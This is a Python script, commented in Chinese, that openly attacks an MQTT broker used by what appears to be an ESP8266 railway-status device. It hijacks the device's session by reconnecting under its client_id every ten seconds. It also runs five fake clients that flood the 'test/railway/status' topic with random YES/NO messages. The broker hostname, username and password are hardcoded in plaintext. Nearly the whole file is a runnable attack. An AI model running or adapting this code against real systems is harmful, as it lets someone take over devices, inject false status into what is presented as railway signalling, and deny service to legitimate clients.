import time
import random
import threading
import paho.mqtt.client as mqtt

BROKER   = "d66bc0b5d19d43cdb7363a4ceb915803.s1.eu.hivemq.cloud"
PORT     = 8883
USERNAME = "esp8266client"
PASSWORD = "Aa123456"
TOPIC    = "test/railway/status"

MESSAGES = ["YES", "NO"]

# ----------- 攻擊 1：會話劫持 -----------
def session_hijack_loop():
    while True:
        client = mqtt.Client(client_id="ESP8266_Railway")  # 假裝是原本的 client_id
        client.username_pw_set(USERNAME, PASSWORD)
        client.tls_set()

        try:
            client.connect(BROKER, PORT)
            client.loop_start()
            print("[HIJACK] 假冒 client_id 已連線，踢掉原 client")
            time.sleep(10)  # 每 10 秒重連一次，反覆搶占
        except Exception as e:
            print(f"[HIJACK] 連線失敗：{e}")
        finally:
            client.loop_stop()
            client.disconnect()

# ----------- 攻擊 2：DoS 干擾訊息 -----------
def dos_fake_client(index):
    client_id = f"FakeClient_{index}_{int(time.time())}"
    client = mqtt.Client(client_id=client_id)
    client.username_pw_set(USERNAME, PASSWORD)
    client.tls_set()

    try:
        client.connect(BROKER, PORT)
        client.loop_start()
        print(f"[DoS-{index}] 已連線：{client_id}")

        while True:
            msg = random.choice(MESSAGES)
            client.publish(TOPIC, msg, qos=1)
            print(f"[DoS-{index}] 發送 {msg}")
            time.sleep(random.uniform(3, 6))  # 隨機間隔干擾
    except Exception as e:
        print(f"[DoS-{index}] 錯誤：{e}")
    finally:
        client.loop_stop()
        client.disconnect()

# ----------- 主程式啟動 -----------
def main():
    threading.Thread(target=session_hijack_loop, daemon=True).start()

    dos_count = 5  # 想要幾個 DoS client
    for i in range(dos_count):
        threading.Thread(target=dos_fake_client, args=(i,), daemon=True).start()
        time.sleep(0.5)

    # 永遠不退出
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
